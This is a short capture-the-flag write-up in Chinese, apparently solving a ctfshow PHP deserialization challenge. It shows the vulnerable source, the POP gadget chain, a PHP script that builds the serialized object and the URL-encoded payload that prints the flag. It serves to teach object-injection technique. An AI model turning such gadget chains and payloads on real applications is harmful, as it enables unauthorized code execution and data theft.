先看代码
~~~
<?php
/**
 * @Author: F10wers_13eiCheng
 * @Date:   2022-02-01 11:25:02
 * @Last Modified by:   F10wers_13eiCheng
 * @Last Modified time: 2022-02-07 15:08:18
 */
include("./HappyYear.php");

class one {
    public $object;

    public function MeMeMe() {
        array_walk($this, function($fn, $prev){
            if ($fn[0] === "Happy_func" && $prev === "year_parm") {
                global $talk;
                echo "$talk"."</br>";
                global $flag;
                echo $flag;
            }
        });
    }

    public function __destruct() {
        @$this->object->add();
    }

    public function __toString() {
        return $this->object->string;
    }
}

class second {
    protected $filename;

    protected function addMe() {
        return "Wow you have sovled".$this->filename;
    }

    public function __call($func, $args) {
        call_user_func([$this, $func."Me"], $args);
    }
}

class third {
    private $string;

    public function __construct($string) {
        $this->string = $string;
    }

    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}

if (isset($_GET["ctfshow"])) {
    $a=unserialize($_GET['ctfshow']);
    throw new Exception("高一新生报道");
} else {
    highlight_file(__FILE__);
}
~~~

POP链：one::__destruct => second::__call => second::addMe => one::__toString => third::__get => one:MeMeMe

### code

~~~
<?php
class one {
    public $object;
}

class second {
    protected $filename;
    public function __construct($filename){
        $this->filename=$filename;
    }
}

class third {
    private $string;

    public function __construct($string) {
        $this->string = $string;
    }
}

$a3=new one();
$a2=new one();
$a1=new one();
$a1->object=new second($a2);
$a2->object=new third(['string'=>[$a3,'MeMeMe']]);
$a3->year_parm=['Happy_func'];
echo urlencode(serialize($a1));
~~~

### payload

~~~
O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D
~~~
